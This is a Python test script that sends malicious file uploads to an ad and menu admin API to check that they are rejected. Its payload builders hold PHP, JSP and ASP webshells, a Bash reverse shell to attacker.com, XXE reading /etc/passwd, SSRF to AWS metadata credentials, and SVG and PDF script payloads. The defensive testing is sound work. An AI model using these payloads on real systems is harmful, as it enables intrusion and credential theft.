"""
File Upload Security Test Script
Tests: /add_ad  |  /update_ad  |  /api/create_menu_with_submenu

Attack categories covered:
  - Polyglot attacks      (JPEG magic + SVG/HTML/PHP body)
  - Webshell variants     (PHP, JSP, ASP, Bash, Perl hidden in JPEG magic)
  - Double extension      (shell.php.jpg, shell.php.png)
  - SVG XSS               (<script>, onload, foreignObject, CSS @import, data URI)
  - SVG XXE               (<!ENTITY xxe SYSTEM file:///>)
  - SVG SSRF              (external image href to internal network)
  - PDF active content    (/JavaScript OpenAction)
  - Executable spoofs     (PE/MZ, GIF, TIFF, WebP as JPEG)
  - MIME spoofing         (PNG bytes + image/jpeg Content-Type)
  - Filename attacks      (null byte, path traversal)
  - Content in metadata   (PHP injected in JPEG comment segment)
  - Edge cases            (empty file, random binary data)

Run:
    pip install requests
    python tests/test_upload_security.py

Set BASE_URL, USER_ID, and EXISTING_AD_ID below before running.
Requests are sent without authentication — bad files must be rejected
before auth runs, or the server must not crash.
"""

import io
import json
import struct
import zlib
import requests
import sys

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
BASE_URL       = "https://bsesadmin.greymatterz.com/api"
USER_ID        = 1
EXISTING_AD_ID = None   # REQUIRED for update_ad tests — paste a real ad UUID here
                        # e.g. "249ab1b0-2195-4604-98af-510749bee018"
                        # Without this, update_ad returns 404 before file validation runs
# ──────────────────────────────────────────────

PASS  = "\033[92m[PASS]\033[0m"
FAIL  = "\033[91m[FAIL]\033[0m"
CRASH = "\033[93m[CRASH]\033[0m"
INFO  = "\033[94m[INFO]\033[0m"

_JPEG_MAGIC = bytes([0xFF, 0xD8, 0xFF, 0xE0])


# ──────────────────────────────────────────────
# Legitimate file builders
# ──────────────────────────────────────────────

def make_valid_jpeg() -> bytes:
    """Minimal valid 1×1 JPEG (ends with FFD9)."""
    return bytes([
        0xFF,0xD8,0xFF,0xE0, 0x00,0x10, 0x4A,0x46,0x49,0x46, 0x00,
        0x01,0x01,0x00, 0x00,0x01, 0x00,0x01, 0x00,0x00,
        0xFF,0xDB, 0x00,0x43, 0x00,
        *([0x08]*64),
        0xFF,0xC0, 0x00,0x0B, 0x08, 0x00,0x01, 0x00,0x01,
        0x01, 0x01,0x11, 0x00,
        0xFF,0xC4, 0x00,0x1F, 0x00, 0x00,0x01,0x05,0x01,0x01,
        0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
        0x09,0x0A,0x0B,
        0xFF,0xDA, 0x00,0x08, 0x01,0x01,0x00,0x00, 0x3F,0x00,
        0x7F,0xA4,
        0xFF,0xD9,
    ])


def make_valid_png() -> bytes:
    """Minimal valid 1×1 PNG."""
    def chunk(ctype: bytes, data: bytes) -> bytes:
        c = ctype + data
        return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    idat = zlib.compress(b"\x00\xFF\x00\x00")
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def make_valid_pdf() -> bytes:
    """Minimal valid PDF with no scripts."""
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        b"xref\n0 4\n"
        b"0000000000 65535 f\r\n0000000009 00000 n\r\n"
        b"0000000058 00000 n\r\n0000000115 00000 n\r\n"
        b"trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n190\n%%EOF\n"
    )


# ──────────────────────────────────────────────
# Attack payload builders
# ──────────────────────────────────────────────

# ── Polyglot / content injection ─────────────

def make_svg_as_jpeg() -> bytes:
    """Polyglot: JPEG magic + SVG+JS — exact Burp Suite screenshot attack."""
    return _JPEG_MAGIC + b"""<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="124" height="124" fill="#000"/>
  <script type="text/javascript">alert(document.domain);</script>
</svg>"""


def make_html_as_jpeg() -> bytes:
    """HTML page with inline script hidden behind JPEG magic bytes."""
    return _JPEG_MAGIC + b"<html><body><script>alert(1)</script></body></html>"


def make_php_webshell_as_jpg() -> bytes:
    """PHP webshell (<?php) hidden behind JPEG magic bytes."""
    return _JPEG_MAGIC + b"<?php system($_GET['cmd']); ?>"


def make_jsp_webshell_as_jpg() -> bytes:
    """JSP webshell (<%) hidden behind JPEG magic bytes."""
    return _JPEG_MAGIC + b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'


def make_asp_webshell_as_jpg() -> bytes:
    """ASP webshell (<%) hidden behind JPEG magic bytes."""
    return _JPEG_MAGIC + b'<% Execute(Request("cmd")) %>'


def make_bash_script_as_jpg() -> bytes:
    """Bash reverse shell hidden behind JPEG magic bytes."""
    return _JPEG_MAGIC + b"#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1"


def make_perl_webshell_as_jpg() -> bytes:
    """Perl webshell hidden behind JPEG magic bytes."""
    return _JPEG_MAGIC + b'#!/usr/bin/perl\nuse Socket;\nexec("/bin/sh -i");'


def make_jpeg_with_php_in_comment() -> bytes:
    """
    Valid JPEG structure with PHP webshell injected into the JPEG
    comment segment (0xFFFE).  Ends with proper FFD9 EOI marker.
    Bypasses simple magic-byte checks — payload sits in metadata.
    """
    php = b"<?php system($_GET['cmd']); ?>"
    seg_len = len(php) + 2          # COM length field includes itself
    return (
        b"\xff\xd8"                              # SOI
        + b"\xff\xfe"                            # COM marker
        + seg_len.to_bytes(2, "big")             # segment length
        + php                                    # webshell in comment
        + b"\xff\xd9"                            # EOI
    )


# ── Wrong image format spoofs ─────────────────

def make_gif_as_jpeg() -> bytes:
    """GIF89a file sent with JPEG MIME type — wrong magic bytes."""
    return b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;"


def make_tiff_as_jpeg() -> bytes:
    """Little-endian TIFF file sent with JPEG MIME type."""
    return b"II*\x00\x08\x00\x00\x00\x00\x00"


def make_webp_as_jpeg() -> bytes:
    """WebP file sent with JPEG MIME type."""
    return b"RIFF\x24\x00\x00\x00WEBPVP8 \x18\x00\x00\x00\x30\x01\x00\x9d\x01\x2a\x01\x00\x01\x00\x02\x00\x34\x25\xa4\x00\x03\x70\x00\xfe\xfb\x94\x00\x00"


def make_bmp_as_jpeg() -> bytes:
    """BMP file (magic BM) sent with JPEG MIME type."""
    return b"BM\x3a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00"


# ── SVG XSS / XXE / SSRF variants ────────────

def make_svg_with_script() -> bytes:
    """Pure SVG with <script> tag — sent as image/svg+xml."""
    return b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>"""


def make_svg_xxe() -> bytes:
    """SVG with XXE entity trying to read /etc/passwd."""
    return b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""


def make_svg_onload() -> bytes:
    """SVG with onload event handler — XSS via attribute."""
    return b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100" height="100"/>
</svg>"""


def make_svg_foreign_object() -> bytes:
    """SVG with foreignObject containing an HTML script tag."""
    return b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xhtml="http://www.w3.org/1999/xhtml">
  <foreignObject width="100" height="100">
    <xhtml:body>
      <xhtml:script>alert(document.cookie)</xhtml:script>
    </xhtml:body>
  </foreignObject>
</svg>"""


def make_svg_css_import() -> bytes:
    """SVG with <style> containing @import url('javascript:...')."""
    return b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <style>@import url('javascript:alert(1)')</style>
  <rect width="100" height="100"/>
</svg>"""


def make_svg_data_uri() -> bytes:
    """SVG with data: URI pointing to HTML+script."""
    return b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"/>
</svg>"""


def make_svg_ssrf() -> bytes:
    """SVG with <image href> pointing to AWS metadata endpoint (SSRF)."""
    return b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <image width="100" height="100"
         href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
</svg>"""


# ── PDF active content ────────────────────────

def make_pdf_with_js() -> bytes:
    """PDF with /JavaScript OpenAction — auto-executes on open."""
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R "
        b"/OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        b"xref\n0 4\n0000000000 65535 f\r\n0000000009 00000 n\r\n"
        b"0000000115 00000 n\r\n0000000172 00000 n\r\n"
        b"trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n247\n%%EOF\n"
    )


# ── Executable / binary spoofs ────────────────

def make_pe_as_jpg() -> bytes:
    """Windows PE/MZ executable disguised as JPEG."""
    return b"MZ" + b"\x00" * 60 + b"PE\x00\x00"


# ── Edge cases ────────────────────────────────

def make_empty_file() -> bytes:
    """Zero-byte file."""
    return b""


def make_random_binary() -> bytes:
    """Random binary garbage — no valid magic bytes."""
    return bytes(range(256)) * 2


# ──────────────────────────────────────────────
# Result tracker
# ──────────────────────────────────────────────

class Result:
    def __init__(self):
        self.passed  = 0
        self.failed  = 0
        self.crashed = 0
        self.rows: list[tuple] = []

    def record(self, name: str, expect_block: bool, status: int, body: str):
        clean_block  = status in (400, 403, 415, 422)
        server_crash = status in (500, 502, 503, 504)
        auth_reject  = status == 401

        if expect_block:
            if clean_block:
                label, note = PASS,  "correctly blocked"
                self.passed += 1
            elif server_crash:
                label, note = CRASH, f"SERVER CRASH — HTTP {status} (fix: validate before crash path)"
                self.crashed += 1
                self.failed  += 1
            elif auth_reject:
                label, note = FAIL,  f"HTTP {status} — reached auth check (file not rejected early enough)"
                self.failed  += 1
            else:
                label, note = FAIL,  f"NOT blocked — HTTP {status}: {body[:80]}"
                self.failed  += 1
        else:
            ok = status in (200, 201)
            label = PASS if ok else FAIL
            note  = "accepted" if ok else f"rejected — HTTP {status}: {body[:100]}"
            if ok:
                self.passed += 1
            else:
                self.failed += 1

        self.rows.append((label, name, note))
        print(f"  {label} {name:<65} → {note}")

    def summary(self):
        total = self.passed + self.failed
        print(f"\n{'─'*80}")
        print(f"  Total: {total}   {PASS} {self.passed}   "
              f"{FAIL} {self.failed - self.crashed}   {CRASH} {self.crashed}")
        print(f"{'─'*80}\n")


# ──────────────────────────────────────────────
# Shared minimal form data
# ──────────────────────────────────────────────

AD_FORM = {
    "ad_name":         "FileUploadTest",
    "ad_type":         "on_menu_ad",
    "chatbot_options": json.dumps(["opt1"]),
    "divisions":       json.dumps(["DIV1"]),
    "start_time":      "2026-03-01T10:00:00",
    "end_time":        "2026-03-10T10:00:00",
    "is_active":       "true",
}

MENU_FORM = {
    "user_id":    str(USER_ID),
    "name":       "FileUploadMenuTest",
    "lang":       "en",
    "is_visible": "true",
    "submenus":   json.dumps([{
        "name": "Sub1", "lang": "en", "is_visible": True,
        "intents": [{"name": "test_intent", "examples": [],
                     "actions": [], "utters": []}]
    }]),
}


# ──────────────────────────────────────────────
# POST /add_ad
# ──────────────────────────────────────────────

def run_add_ad_tests(r: Result):
    print(f"\n{'═'*80}")
    print("  POST /add_ad — file upload security")
    print(f"{'═'*80}")

    url = f"{BASE_URL}/add_ad"

    def post_img(name, data, mime="image/jpeg", pdf=None):
        return requests.post(url, files={
            "ad_image": (name, io.BytesIO(data), mime),
            "ad_pdf":   pdf or ("doc.pdf", io.BytesIO(make_valid_pdf()), "application/pdf"),
        }, data=AD_FORM, verify=False)

    # ── Polyglot (JPEG magic + foreign content) ──────────────────────────────
    resp = post_img("images.jpg", make_svg_as_jpeg())
    r.record("Polyglot — JPEG magic + SVG+JS (Burp attack)", True, resp.status_code, resp.text)

    resp = post_img("photo.jpg", make_html_as_jpeg())
    r.record("Polyglot — JPEG magic + HTML+<script>", True, resp.status_code, resp.text)

    # ── Webshell variants behind JPEG magic ──────────────────────────────────
    resp = post_img("shell.jpg", make_php_webshell_as_jpg())
    r.record("Webshell — PHP (<?php system()>) as JPEG", True, resp.status_code, resp.text)

    resp = post_img("shell.jpg", make_jsp_webshell_as_jpg())
    r.record("Webshell — JSP (<% Runtime.exec()>) as JPEG", True, resp.status_code, resp.text)

    resp = post_img("shell.jpg", make_asp_webshell_as_jpg())
    r.record("Webshell — ASP (<% Execute()>) as JPEG", True, resp.status_code, resp.text)

    resp = post_img("shell.jpg", make_bash_script_as_jpg())
    r.record("Webshell — Bash reverse shell as JPEG", True, resp.status_code, resp.text)

    resp = post_img("shell.jpg", make_perl_webshell_as_jpg())
    r.record("Webshell — Perl exec shell as JPEG", True, resp.status_code, resp.text)

    resp = post_img("photo.jpg", make_jpeg_with_php_in_comment())
    r.record("Webshell — PHP injected in JPEG COM segment (FFD8 FFE FFD9 valid)", True,
             resp.status_code, resp.text)

    # ── Double extension ─────────────────────────────────────────────────────
    resp = post_img("shell.php.jpg", make_valid_jpeg())
    r.record("Double extension — shell.php.jpg", True, resp.status_code, resp.text)

    resp = post_img("shell.php.png", make_valid_png(), "image/png")
    r.record("Double extension — shell.php.png", True, resp.status_code, resp.text)

    resp = post_img("shell.asp.jpg", make_valid_jpeg())
    r.record("Double extension — shell.asp.jpg", True, resp.status_code, resp.text)

    # ── Wrong image format sent as JPEG ──────────────────────────────────────
    resp = post_img("photo.jpg", make_gif_as_jpeg())
    r.record("Format spoof — GIF89a file sent as image/jpeg", True, resp.status_code, resp.text)

    resp = post_img("photo.jpg", make_tiff_as_jpeg())
    r.record("Format spoof — TIFF file sent as image/jpeg", True, resp.status_code, resp.text)

    resp = post_img("photo.jpg", make_webp_as_jpeg())
    r.record("Format spoof — WebP file sent as image/jpeg", True, resp.status_code, resp.text)

    resp = post_img("photo.jpg", make_bmp_as_jpeg())
    r.record("Format spoof — BMP file sent as image/jpeg", True, resp.status_code, resp.text)

    resp = post_img("photo.jpg", make_pe_as_jpg())
    r.record("Format spoof — PE/MZ executable as JPEG", True, resp.status_code, resp.text)

    # ── MIME type mismatch ───────────────────────────────────────────────────
    resp = post_img("photo.jpg", make_valid_png())
    r.record("MIME spoof — PNG bytes with image/jpeg Content-Type", True,
             resp.status_code, resp.text)

    # ── Filename-based attacks ───────────────────────────────────────────────
    resp = post_img("shell.php\x00.jpg", make_valid_jpeg())
    r.record("Filename — null byte injection (shell.php\\x00.jpg)", True,
             resp.status_code, resp.text)

    resp = post_img("../../shell.jpg", make_valid_jpeg())
    r.record("Filename — path traversal (../../shell.jpg)", True,
             resp.status_code, resp.text)

    resp = post_img("A" * 300 + ".jpg", make_valid_jpeg())
    r.record("Filename — excessively long name (300 chars + .jpg)", True,
             resp.status_code, resp.text)

    # ── SVG XSS variants ─────────────────────────────────────────────────────
    resp = post_img("icon.svg", make_svg_with_script(), "image/svg+xml")
    r.record("SVG XSS — <script>alert()</script>", True, resp.status_code, resp.text)

    resp = post_img("icon.svg", make_svg_onload(), "image/svg+xml")
    r.record("SVG XSS — onload=\"alert()\" attribute", True, resp.status_code, resp.text)

    resp = post_img("icon.svg", make_svg_foreign_object(), "image/svg+xml")
    r.record("SVG XSS — foreignObject + <xhtml:script>", True, resp.status_code, resp.text)

    resp = post_img("icon.svg", make_svg_css_import(), "image/svg+xml")
    r.record("SVG XSS — <style>@import url('javascript:')</style>", True,
             resp.status_code, resp.text)

    resp = post_img("icon.svg", make_svg_data_uri(), "image/svg+xml")
    r.record("SVG XSS — data: URI containing HTML+script", True, resp.status_code, resp.text)

    # ── SVG injection / SSRF ─────────────────────────────────────────────────
    resp = post_img("icon.svg", make_svg_xxe(), "image/svg+xml")
    r.record("SVG XXE — <!ENTITY xxe SYSTEM file:///etc/passwd>", True,
             resp.status_code, resp.text)

    resp = post_img("icon.svg", make_svg_ssrf(), "image/svg+xml")
    r.record("SVG SSRF — <image href=http://169.254.169.254/...> (AWS metadata)", True,
             resp.status_code, resp.text)

    # ── PDF active content ───────────────────────────────────────────────────
    resp = requests.post(url, files={
        "ad_image": ("img.jpg",   io.BytesIO(make_valid_jpeg()),  "image/jpeg"),
        "ad_pdf":   ("evil.pdf",  io.BytesIO(make_pdf_with_js()), "application/pdf"),
    }, data=AD_FORM, verify=False)
    r.record("PDF — /JavaScript OpenAction in ad_pdf slot", True, resp.status_code, resp.text)

    # ── Edge cases ───────────────────────────────────────────────────────────
    resp = post_img("empty.jpg", make_empty_file())
    r.record("Edge case — empty file (0 bytes)", True, resp.status_code, resp.text)

    resp = post_img("random.jpg", make_random_binary())
    r.record("Edge case — random binary garbage as JPEG", True, resp.status_code, resp.text)

    # ── Missing required files ───────────────────────────────────────────────
    resp = requests.post(url, files={
        "ad_pdf": ("doc.pdf", io.BytesIO(make_valid_pdf()), "application/pdf"),
    }, data=AD_FORM, verify=False)
    r.record("Missing — required ad_image file absent", True, resp.status_code, resp.text)

    resp = requests.post(url, files={
        "ad_image": ("img.jpg", io.BytesIO(make_valid_jpeg()), "image/jpeg"),
    }, data=AD_FORM, verify=False)
    r.record("Missing — required ad_pdf file absent", True, resp.status_code, resp.text)


# ──────────────────────────────────────────────
# PUT /update_ad
# ──────────────────────────────────────────────

def run_update_ad_tests(r: Result, ad_id: str):
    print(f"\n{'═'*80}")
    print(f"  PUT /update_ad?ad_id={ad_id} — file upload security")
    print(f"{'═'*80}")

    url = f"{BASE_URL}/update_ad?ad_id={ad_id}"

    def put_img(name, data, mime="image/jpeg", pdf=None):
        return requests.put(url, files={
            "ad_image": (name, io.BytesIO(data), mime),
            "ad_pdf":   pdf or ("doc.pdf", io.BytesIO(make_valid_pdf()), "application/pdf"),
        }, data=AD_FORM, verify=False)

    resp = put_img("images.jpg", make_svg_as_jpeg())
    r.record("[update] Polyglot — JPEG magic + SVG+JS", True, resp.status_code, resp.text)

    resp = put_img("photo.jpg", make_html_as_jpeg())
    r.record("[update] Polyglot — JPEG magic + HTML+<script>", True, resp.status_code, resp.text)

    resp = put_img("shell.jpg", make_php_webshell_as_jpg())
    r.record("[update] Webshell — PHP as JPEG", True, resp.status_code, resp.text)

    resp = put_img("shell.jpg", make_jsp_webshell_as_jpg())
    r.record("[update] Webshell — JSP as JPEG", True, resp.status_code, resp.text)

    resp = put_img("shell.jpg", make_asp_webshell_as_jpg())
    r.record("[update] Webshell — ASP as JPEG", True, resp.status_code, resp.text)

    resp = put_img("shell.jpg", make_bash_script_as_jpg())
    r.record("[update] Webshell — Bash reverse shell as JPEG", True, resp.status_code, resp.text)

    resp = put_img("photo.jpg", make_jpeg_with_php_in_comment())
    r.record("[update] Webshell — PHP in JPEG COM segment", True, resp.status_code, resp.text)

    resp = put_img("shell.php.jpg", make_valid_jpeg())
    r.record("[update] Double extension — shell.php.jpg", True, resp.status_code, resp.text)

    resp = put_img("photo.jpg", make_gif_as_jpeg())
    r.record("[update] Format spoof — GIF as image/jpeg", True, resp.status_code, resp.text)

    resp = put_img("photo.jpg", make_tiff_as_jpeg())
    r.record("[update] Format spoof — TIFF as image/jpeg", True, resp.status_code, resp.text)

    resp = put_img("icon.svg", make_svg_with_script(), "image/svg+xml")
    r.record("[update] SVG XSS — <script> tag", True, resp.status_code, resp.text)

    resp = put_img("icon.svg", make_svg_onload(), "image/svg+xml")
    r.record("[update] SVG XSS — onload attribute", True, resp.status_code, resp.text)

    resp = put_img("icon.svg", make_svg_foreign_object(), "image/svg+xml")
    r.record("[update] SVG XSS — foreignObject + xhtml:script", True, resp.status_code, resp.text)

    resp = put_img("icon.svg", make_svg_ssrf(), "image/svg+xml")
    r.record("[update] SVG SSRF — external image href", True, resp.status_code, resp.text)

    resp = put_img("icon.svg", make_svg_xxe(), "image/svg+xml")
    r.record("[update] SVG XXE — <!ENTITY> file read", True, resp.status_code, resp.text)

    resp = requests.put(url, files={
        "ad_image": ("img.jpg",  io.BytesIO(make_valid_jpeg()),  "image/jpeg"),
        "ad_pdf":   ("evil.pdf", io.BytesIO(make_pdf_with_js()), "application/pdf"),
    }, data=AD_FORM, verify=False)
    r.record("[update] PDF /JavaScript OpenAction", True, resp.status_code, resp.text)

    resp = put_img("empty.jpg", make_empty_file())
    r.record("[update] Edge case — empty file", True, resp.status_code, resp.text)


# ──────────────────────────────────────────────
# POST /api/create_menu_with_submenu
# ──────────────────────────────────────────────

def run_create_menu_tests(r: Result):
    print(f"\n{'═'*80}")
    print("  POST /api/create_menu_with_submenu — file upload security")
    print(f"{'═'*80}")

    url = f"{BASE_URL}/api/create_menu_with_submenu"

    def post_menu(name, data, mime="image/jpeg"):
        return requests.post(url, files={
            "menu_icon": (name, io.BytesIO(data), mime),
        }, data=MENU_FORM, verify=False)

    def post_sub(name, data, mime="image/jpeg"):
        return requests.post(url, files={
            "submenu_icon_0": (name, io.BytesIO(data), mime),
        }, data=MENU_FORM, verify=False)

    # ── menu_icon slot ───────────────────────────────────────────────────────
    resp = post_menu("images.jpg", make_svg_as_jpeg())
    r.record("[menu] Polyglot — JPEG magic + SVG+JS as menu_icon", True,
             resp.status_code, resp.text)

    resp = post_menu("photo.jpg", make_html_as_jpeg())
    r.record("[menu] Polyglot — JPEG magic + HTML+<script> as menu_icon", True,
             resp.status_code, resp.text)

    resp = post_menu("shell.jpg", make_php_webshell_as_jpg())
    r.record("[menu] Webshell — PHP as menu_icon", True, resp.status_code, resp.text)

    resp = post_menu("shell.jpg", make_jsp_webshell_as_jpg())
    r.record("[menu] Webshell — JSP as menu_icon", True, resp.status_code, resp.text)

    resp = post_menu("shell.jpg", make_bash_script_as_jpg())
    r.record("[menu] Webshell — Bash as menu_icon", True, resp.status_code, resp.text)

    resp = post_menu("photo.jpg", make_jpeg_with_php_in_comment())
    r.record("[menu] Webshell — PHP in JPEG COM segment as menu_icon", True,
             resp.status_code, resp.text)

    resp = post_menu("icon.svg", make_svg_with_script(), "image/svg+xml")
    r.record("[menu] SVG XSS — <script> as menu_icon", True, resp.status_code, resp.text)

    resp = post_menu("icon.svg", make_svg_onload(), "image/svg+xml")
    r.record("[menu] SVG XSS — onload attribute as menu_icon", True, resp.status_code, resp.text)

    resp = post_menu("icon.svg", make_svg_foreign_object(), "image/svg+xml")
    r.record("[menu] SVG XSS — foreignObject as menu_icon", True, resp.status_code, resp.text)

    resp = post_menu("icon.svg", make_svg_css_import(), "image/svg+xml")
    r.record("[menu] SVG XSS — CSS @import javascript as menu_icon", True,
             resp.status_code, resp.text)

    resp = post_menu("icon.svg", make_svg_xxe(), "image/svg+xml")
    r.record("[menu] SVG XXE — file read as menu_icon", True, resp.status_code, resp.text)

    resp = post_menu("icon.svg", make_svg_ssrf(), "image/svg+xml")
    r.record("[menu] SVG SSRF — AWS metadata href as menu_icon", True,
             resp.status_code, resp.text)

    resp = post_menu("photo.jpg", make_gif_as_jpeg())
    r.record("[menu] Format spoof — GIF as image/jpeg for menu_icon", True,
             resp.status_code, resp.text)

    resp = post_menu("photo.jpg", make_tiff_as_jpeg())
    r.record("[menu] Format spoof — TIFF as image/jpeg for menu_icon", True,
             resp.status_code, resp.text)

    resp = post_menu("photo.jpg", make_pe_as_jpg())
    r.record("[menu] Format spoof — PE/MZ executable as menu_icon", True,
             resp.status_code, resp.text)

    # ── submenu_icon slot ────────────────────────────────────────────────────
    resp = post_sub("shell.jpg", make_php_webshell_as_jpg())
    r.record("[menu] Webshell — PHP as submenu_icon_0", True, resp.status_code, resp.text)

    resp = post_sub("shell.jpg", make_asp_webshell_as_jpg())
    r.record("[menu] Webshell — ASP as submenu_icon_0", True, resp.status_code, resp.text)

    resp = post_sub("photo.jpg", make_html_as_jpeg())
    r.record("[menu] Polyglot — HTML+script as submenu_icon_0", True,
             resp.status_code, resp.text)

    resp = post_sub("icon.php.png", make_valid_png(), "image/png")
    r.record("[menu] Double extension — icon.php.png as submenu_icon_0", True,
             resp.status_code, resp.text)

    resp = post_sub("photo.jpg", make_gif_as_jpeg())
    r.record("[menu] Format spoof — GIF as submenu_icon_0", True, resp.status_code, resp.text)

    resp = post_sub("photo.jpg", make_tiff_as_jpeg())
    r.record("[menu] Format spoof — TIFF as submenu_icon_0", True, resp.status_code, resp.text)

    resp = post_sub("photo.jpg", make_valid_png())
    r.record("[menu] MIME spoof — PNG bytes as image/jpeg on submenu_icon_0", True,
             resp.status_code, resp.text)

    resp = post_sub("empty.jpg", make_empty_file())
    r.record("[menu] Edge case — empty submenu_icon_0", True, resp.status_code, resp.text)


# ──────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────

def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print(f"\n{'═'*80}")
    print("  File Upload Security Test Suite")
    print(f"  Target : {BASE_URL}")
    print(f"{'═'*80}")

    r = Result()

    run_add_ad_tests(r)

    if EXISTING_AD_ID:
        run_update_ad_tests(r, EXISTING_AD_ID)
    else:
        print(f"\n{INFO} Skipping /update_ad — set EXISTING_AD_ID in config")

    run_create_menu_tests(r)

    r.summary()
    sys.exit(0 if r.failed == 0 else 1)


if __name__ == "__main__":
    main()
